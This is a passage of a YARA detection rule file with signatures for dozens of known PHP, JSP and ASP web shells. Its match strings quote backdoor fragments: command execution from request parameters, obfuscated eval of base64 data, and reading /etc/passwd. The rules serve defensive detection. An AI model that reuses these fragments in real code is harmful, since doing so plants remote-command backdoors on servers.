        hash = "5391c4a8af1ede757ba9d28865e75853"

    strings:
        $s6 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword
    condition:
        all of them
}
rule webshell_jsp_k81 {
    meta:
        id = "xrJeEBVkrwmg9bA1ptw0P"
        fingerprint = "v1_sha256_f9c6b5bec9313c6fd059055fa18332675838419bba3348bb852b50806f26ccb2"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file k81.jsp"
        category = "INFO"
        hash = "41efc5c71b6885add9c1d516371bd6af"

    strings:
        $s1 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword
        $s9 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword
    condition:
        1 of them
}
rule webshell_ASP_zehir {
    meta:
        id = "64oeQMmahPSoEpJplQcAts"
        fingerprint = "v1_sha256_90920258017cf189da128dce477e71f0040bc66aefa6f018f64db64d22f60ae5"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file zehir.asp"
        category = "INFO"
        hash = "0061d800aee63ccaf41d2d62ec15985d"

    strings:
        $s9 = "Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&"
    condition:
        all of them
}
rule webshell_Worse_Linux_Shell {
    meta:
        id = "29dPVrQeOJHkjrZyfsfzCv"
        fingerprint = "v1_sha256_a24e7ae7c722da7f265f032315b1e8e402c2fc4a2a54a685671a9e52124f6553"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Worse Linux Shell.php"
        category = "INFO"
        hash = "8338c8d9eab10bd38a7116eb534b5fa2"

    strings:
        $s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD"
    condition:
        all of them
}
rule webshell_zacosmall {
    meta:
        id = "4VT30g76v3KMfhZAU0SrBU"
        fingerprint = "v1_sha256_739d58e3ab6712c703e0cb0e0070afec3376844b77ed081a5d12407cabb62319"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file zacosmall.php"
        category = "INFO"
        hash = "5295ee8dc2f5fd416be442548d68f7a6"

    strings:
        $s0 = "if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\"</strong><hr>"
    condition:
        all of them
}
rule webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit {
    meta:
        id = "6Rf6rWiiwfPQ1bTLTEI2VG"
        fingerprint = "v1_sha256_9630fc0371193bfbd0bd4fb15856477e7739fc9f11ee539d119ee837b1a54502"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
        category = "INFO"
        hash = "c6eeacbe779518ea78b8f7ed5f63fc11"

    strings:
        $s1 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
    condition:
        all of them
}
rule webshell_redirect {
    meta:
        id = "20IQLdwlfFDKvd7cc2sGVC"
        fingerprint = "v1_sha256_b16026623fe7802db9823ad4a3dab051747eea6bd41ce72a0c8c6757bfa2c6f7"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file redirect.asp"
        category = "INFO"
        hash = "97da83c6e3efbba98df270cc70beb8f8"

    strings:
        $s7 = "var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" "
    condition:
        all of them
}
rule webshell_jsp_cmdjsp {
    meta:
        id = "3zOjJY4GCNFESijsxHrGYJ"
        fingerprint = "v1_sha256_b4822e47a27c598be746ac71bf9b60dafe08d50c83a2dfee5e40ea384fcff21a"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file cmdjsp.jsp"
        category = "INFO"
        hash = "b815611cc39f17f05a73444d699341d4"

    strings:
        $s5 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
    condition:
        all of them
}
rule webshell_Java_Shell {
    meta:
        id = "6tsuhqI7zmGe0yuO6YMYix"
        fingerprint = "v1_sha256_0d313ff81a36b456326df0054853c31d69710fc142fcfa65747691238af4e635"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Java Shell.jsp"
        category = "INFO"
        hash = "36403bc776eb12e8b7cc0eb47c8aac83"

    strings:
        $s4 = "public JythonShell(int columns, int rows, int scrollback) {" fullword
        $s9 = "this(null, Py.getSystemState(), columns, rows, scrollback);" fullword
    condition:
        1 of them
}
rule webshell_asp_1d {
    meta:
        id = "2Kunnfk0ZWsAitdzgoPEYk"
        fingerprint = "v1_sha256_85b17fde8fb535b64e5eabc887428d9b73adc5bc6741a3a387f235a8b0c6089a"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file 1d.asp"
        category = "INFO"
        hash = "fad7504ca8a55d4453e552621f81563c"

    strings:
        $s0 = "+9JkskOfKhUxZJPL~\\(mD^W~[,{@#@&EO"
    condition:
        all of them
}
rule webshell_jsp_IXRbE {
    meta:
        id = "7NGrfgXbyySG6gBhsAILNJ"
        fingerprint = "v1_sha256_8710d092b81c5de1e328ad6e57e5c4a25748cc92844198038c103dabc1e76e77"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file IXRbE.jsp"
        category = "INFO"
        hash = "e26e7e0ebc6e7662e1123452a939e2cd"

    strings:
        $s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
    condition:
        all of them
}
rule webshell_PHP_G5 {
    meta:
        id = "3nSg6Psl7V6WHpCIncPkYo"
        fingerprint = "v1_sha256_2edffbea5142ef146cec57cb88b473532f56ab3e95151c5648eaeabe6a75feda"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file G5.php"
        category = "INFO"
        hash = "95b4a56140a650c74ed2ec36f08d757f"

    strings:
        $s3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op"
    condition:
        all of them
}
rule webshell_PHP_r57142 {
    meta:
        id = "1El7YAk8uNKLiGNjDTUBEc"
        fingerprint = "v1_sha256_3afa0463de3acb12480dba1b2ab9cd53fca88216ba54c5e044e48ebd84bf17bd"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file r57142.php"
        category = "INFO"
        hash = "0911b6e6b8f4bcb05599b2885a7fe8a8"

    strings:
        $s0 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword
    condition:
        all of them
}
rule webshell_jsp_tree {
    meta:
        id = "7EBQHylH5gWeOKji6GxHwm"
        fingerprint = "v1_sha256_180aa4572a42d23f3e44589f876356ec973fd64cdd53bac69936b93699888ac2"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file tree.jsp"
        category = "INFO"
        hash = "bcdf7bbf7bbfa1ffa4f9a21957dbcdfa"

    strings:
        $s5 = "$('#tt2').tree('options').url = \"selectChild.action?checki"
        $s6 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ"
    condition:
        all of them
}
rule webshell_C99madShell_v_3_0_smowu {
    meta:
        id = "2FcUQAJ9Vh0T9UUwHNQJzb"
        fingerprint = "v1_sha256_d84a5c573b89790efdbe67a684feb7db88521027e86b7588f090696fd90cbc87"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file smowu.php"
        category = "INFO"
        hash = "74e1e7c7a6798f1663efb42882b85bee"

    strings:
        $s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for"
        $s8 = "<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty"
    condition:
        1 of them
}
rule webshell_simple_backdoor {
    meta:
        id = "4Eoy1W1AEwYB1EaFDca5bu"
        fingerprint = "v1_sha256_252285e8a796757235d775427e5a73980d065c1221190545428910a77f46bb9a"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file simple-backdoor.php"
        category = "INFO"
        hash = "f091d1b9274c881f8e41b2f96e6b9936"

    strings:
        $s0 = "$cmd = ($_REQUEST['cmd']);" fullword
        $s1 = "if(isset($_REQUEST['cmd'])){" fullword
        $s4 = "system($cmd);" fullword
    condition:
        2 of them
}
rule webshell_PHP_404 {
    meta:
        id = "4ao1h2xiwQ9DthtRZLDBnV"
        fingerprint = "v1_sha256_b0524ecddf990048e3e40f471c24075c0e87654c6fe40f17dc3ff43743402e24"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file 404.php"
        category = "INFO"
        hash = "078c55ac475ab9e028f94f879f548bca"

    strings:
        $s4 = "<span>Posix_getpwuid (\"Read\" /etc/passwd)"
    condition:
        all of them
}
rule webshell_Macker_s_Private_PHPShell {
    meta:
        id = "5G6RHQVlm7NqQs9MIttyVV"
        fingerprint = "v1_sha256_4bccc1aca8698e601133436a55538c08e3e1fa113a0776c04590eaf4a10fd309"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Macker's Private PHPShell.php"
        category = "INFO"
        hash = "e24cbf0e294da9ac2117dc660d890bb9"

    strings:
        $s3 = "echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n"
        $s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
        $s7 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
    condition:
        all of them
}
rule webshell_Antichat_Shell_v1_3_2 {
    meta:
        id = "5bMpzHVaMoVuKhoIKXhCDG"
        fingerprint = "v1_sha256_d5a1dc31f442f8db7771ee64164436f6c562ef9f4a203a1e2006d37f9df91846"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Antichat Shell v1.3.php"
        category = "INFO"
        hash = "40d0abceba125868be7f3f990f031521"

    strings:
        $s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m"
    condition:
        all of them
}
rule webshell_Safe_mode_breaker {
    meta:
        id = "5yEpQCOHv6PabyhyPYd76y"
        fingerprint = "v1_sha256_4adcefc05413a02653a2a405791345a1a76058a39f6e2b03765c4485f7c6b106"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Safe mode breaker.php"
        category = "INFO"
        hash = "5bd07ccb1111950a5b47327946bfa194"

    strings:
        $s5 = "preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is("
        $s6 = "$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL)."
    condition:
        1 of them
}
rule webshell_Sst_Sheller {
    meta:
        id = "18XR6zLnEn2gTYnpSKZBc4"
        fingerprint = "v1_sha256_4faac0b22fec809f2100bad200ba1f9fb9e16fab743e1b1cbfe0b80c6d2fee32"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Sst-Sheller.php"
        category = "INFO"
        hash = "d93c62a0a042252f7531d8632511ca56"

    strings:
        $s2 = "echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>"
        $s3 = "<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)"
    condition:
        all of them
}
rule webshell_jsp_list {
    meta:
        id = "2WoZ6zvXjPHLcafAmFbHAz"
        fingerprint = "v1_sha256_5641bff0ec161fe72e502641b6138186d541ebfcbf499e0295a61f9f6f085654"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file list.jsp"
        category = "INFO"
        hash = "1ea290ff4259dcaeb680cec992738eda"

    strings:
        $s0 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
        $s2 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn"
        $s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");" fullword
    condition:
        all of them
}
rule webshell_PHPJackal_v1_5 {
    meta:
        id = "7IcQnAXdgDFNHlFdhZQc6g"
        fingerprint = "v1_sha256_457bc71cb8e684dafb14b1c5d2faa4366cedce5eba9545493be2b1d49daf98b6"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file PHPJackal v1.5.php"
        category = "INFO"
        hash = "d76dc20a4017191216a0315b7286056f"

    strings:
        $s7 = "echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form"
        $s8 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr"
    condition:
        all of them
}
rule webshell_customize {
    meta:
        id = "1Dg2hAeA1UgE3viHWy8Awe"
        fingerprint = "v1_sha256_462d97427793ef6e897b33f4fd02d452ad8cd11ddef21aa25d13efc981eb3afb"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file customize.jsp"
        category = "INFO"
        hash = "d55578eccad090f30f5d735b8ec530b1"

    strings:
        $s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
    condition:
        all of them
}
rule webshell_s72_Shell_v1_1_Coding {
    meta:
        id = "1MbJlZizrm5EFluSnsClLU"
        fingerprint = "v1_sha256_fd200d8aa347242546a1da311edc61ceebaec5f7d6b4fe2f49f069b36689f547"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file s72 Shell v1.1 Coding.php"
        category = "INFO"
        hash = "c2e8346a5515c81797af36e7e4a3828e"

    strings:
        $s5 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya "
    condition:
        all of them
}
rule webshell_jsp_sys3 {
    meta:
        id = "7SCojh8IWolx8CTvCVmZFD"
        fingerprint = "v1_sha256_14b0ac1b1b8538b0c05dcd0a8b7129fdcad2e595ea00630bd55cee6dff596d4f"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file sys3.jsp"
        category = "INFO"
        hash = "b3028a854d07674f4d8a9cf2fb6137ec"

    strings:
        $s1 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword
        $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
        $s9 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword
    condition:
        all of them
}
rule webshell_jsp_guige02 {
    meta:
        id = "4p2P52LaS3NUhUxHzrXzjQ"
        fingerprint = "v1_sha256_c214e50b209970c03d389d97673901ec44b2727e5c7588e5e4d0a644cc691423"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file guige02.jsp"
        category = "INFO"
        hash = "a3b8b2280c56eaab777d633535baf21d"

    strings:
        $s0 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff"
        $s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private"
    condition:
        all of them
}
rule webshell_php_ghost {
    meta:
        id = "1afEdni6VInVSkbWOImL1R"
        fingerprint = "v1_sha256_9a7635d313345e7b7cb7424726ed62015afd78412b504e406155f85c4cdf623f"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file ghost.php"
        category = "INFO"
        hash = "38dc8383da0859dca82cf0c943dbf16d"

    strings:
        $s1 = "<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'"
        $s6 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***"
        $s7 = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\"" fullword
    condition:
        all of them
}
rule webshell_WinX_Shell {
    meta:
        id = "mnHIYKmiqXzKLxWyFZKWu"
        fingerprint = "v1_sha256_e6dd5178cafccca751dd3f2e36206acd214a65b2e0783a738a104b3dc680ca21"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file WinX Shell.php"
        category = "INFO"
        hash = "17ab5086aef89d4951fe9b7c7a561dda"

    strings:
        $s5 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">Filenam"
        $s8 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">File: </"
    condition:
        all of them
}
rule webshell_Crystal_Crystal {
    meta:
        id = "4fFcWY0GrGSqua2zY8IBde"
        fingerprint = "v1_sha256_735332a2ec7df65cca4ca69e702c5893d302a01c7ee7b84d01a1e6ab9646de93"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file Crystal.php"
        category = "INFO"
        hash = "fdbf54d5bf3264eb1c4bff1fac548879"

    strings:
        $s1 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value"
        $s6 = "\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f"
    condition:
        all of them
}
rule webshell_r57_1_4_0 {
    meta:
        id = "5DR2FRk9PefE8Igq2BiIl5"
        fingerprint = "v1_sha256_cb48621c572d529b8dc634e7b6360257ad4fce9664bfca7ee7c0101be42d2c24"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file r57.1.4.0.php"
        category = "INFO"
        hash = "574f3303e131242568b0caf3de42f325"

    strings:
        $s4 = "@ini_set('error_log',NULL);" fullword
        $s6 = "$pass='abcdef1234567890abcdef1234567890';" fullword
        $s7 = "@ini_restore(\"disable_functions\");" fullword
        $s9 = "@ini_restore(\"safe_mode_exec_dir\");" fullword
    condition:
        all of them
}
rule webshell_jsp_hsxa1 {
    meta:
        id = "2pSRhUsrh1wBE5G4a61c4E"
        fingerprint = "v1_sha256_7f79b66d87f638bc09ee576de4dc4a8c5b1da7c406d318eeff7a4221c35d2313"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file hsxa1.jsp"
        category = "INFO"
        hash = "5686d5a38c6f5b8c55095af95c2b0244"

    strings:
        $s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
    condition:
        all of them
}
rule webshell_asp_ajn {
    meta:
        id = "2seK4Mr8zPmEvG0p4cKZIu"
        fingerprint = "v1_sha256_0a6c9a210c0337d6b984bcf6cd7f14103a0f6f5d38a26c789519c2b1629aaede"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file ajn.asp"
        category = "INFO"
        hash = "aaafafc5d286f0bff827a931f6378d04"

    strings:
        $s1 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword
        $s6 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve"
    condition:
        all of them
}
rule webshell_php_cmd {
    meta:
        id = "7MJVFkjMwn8cO5S2Lcpc9A"
        fingerprint = "v1_sha256_d9a0802f6fd7047ba5477f6bba61c4ac02cabfce06270fdbd8e8e68a693ccf68"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file cmd.php"
        category = "INFO"
        hash = "c38ae5ba61fd84f6bbbab98d89d8a346"

    strings:
        $s0 = "if($_GET['cmd']) {" fullword
        $s1 = "// cmd.php = Command Execution" fullword
        $s7 = "  system($_GET['cmd']);" fullword
    condition:
        all of them
}
rule webshell_asp_list {
    meta:
        id = "1ZDJGBWW95b8piKjsx8to5"
        fingerprint = "v1_sha256_9c8bdeb5992015b26fbee418ed6e6b7c6b0901f26bddf9dc26706c0b63ea9c95"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file list.asp"
        category = "INFO"
        hash = "1cfa493a165eb4b43e6d4cc0f2eab575"

    strings:
        $s0 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword
        $s4 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword
    condition:
        all of them
}
rule webshell_PHP_co {
    meta:
        id = "10c5g1s8S3H8xe3oPt5IAg"
        fingerprint = "v1_sha256_3fab3e97d10b6c56fb7df8bcd520bda318fc127a620c5aafba09cb36ffd6a8df"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file co.php"
        category = "INFO"
        hash = "62199f5ac721a0cb9b28f465a513874c"

    strings:
        $s0 = "cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV" fullword
        $s11 = "6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j" fullword
    condition:
        all of them
}
rule webshell_PHP_150 {
    meta:
        id = "4dPiyNXy7HvuNk8fmrVceg"
        fingerprint = "v1_sha256_139e3d6aa3cd2b6a9731a6cc14c921f9fd82ff7ca79d156f1ff6bc544897fb12"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file 150.php"
        category = "INFO"
        hash = "400c4b0bed5c90f048398e1d268ce4dc"

    strings:
        $s0 = "HJ3HjqxclkZfp"
        $s1 = "<? eval(gzinflate(base64_decode('" fullword
    condition:
        all of them
}
rule webshell_jsp_cmdjsp_2 {
    meta:
        id = "3otekODHqxP3jUOtwLBgOR"
        fingerprint = "v1_sha256_83be82e260adcff9d3d11344c363f6b5da331339ffe78e561cea9ab09b209030"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file cmdjsp.jsp"
        category = "INFO"
        hash = "1b5ae3649f03784e2a5073fa4d160c8b"

    strings:
        $s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
        $s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
    condition:
        all of them
}
rule webshell_PHP_c37 {
    meta:
        id = "2I8RBzWdASF3CMKucul33O"
        fingerprint = "v1_sha256_b93394f4e05cc96c31a8adcb0981aa8b069780893c469b41ece3d3ce92c42251"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file c37.php"
        category = "INFO"
        hash = "d01144c04e7a46870a8dd823eb2fe5c8"

    strings:
        $s3 = "array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),"
        $s9 = "++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE],"
    condition:
        all of them
}
rule webshell_PHP_b37 {
    meta:
        id = "7FiibKzjRclC4so8EFy2sH"
        fingerprint = "v1_sha256_ae0cca5723a1e885c26ece5082c24f4c95f0262b8e7baf6db5efde5cfee2cc42"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file b37.php"
        category = "INFO"
        hash = "0421445303cfd0ec6bc20b3846e30ff0"

    strings:
        $s0 = "xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc"
    condition:
        all of them
}
rule webshell_php_backdoor {
    meta:
        id = "2Syxx3Ywopi95gxnedBIa4"
        fingerprint = "v1_sha256_1f754b4d29eb93316183cf904b375ded7ccdae1d2196fe05950c449ed0d690f4"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file php-backdoor.php"
        category = "INFO"
        hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"

    strings:
        $s1 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))" fullword
        $s2 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
    condition:
        all of them
}
rule webshell_asp_dabao {
    meta:
        id = "5zPjlpmr5PAO2aG0XyY4QL"
        fingerprint = "v1_sha256_62cf46dc16a7365d196c2cb8ede8b1380a0877d134d3726d7c777096a4eda942"
        version = "1.0"
        score = 70
        date = "2014/01/28"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Web Shell - file dabao.asp"
        category = "INFO"
        hash = "3919b959e3fa7e86d52c2b0a91588d5d"

    strings:
        $s2 = " Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &"
        $s8 = " Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-"
    condition:
        all of them
}
rule webshell_php_2 {
    meta:
        id = "2JVpruC9b6NdusbKU1sJCx"
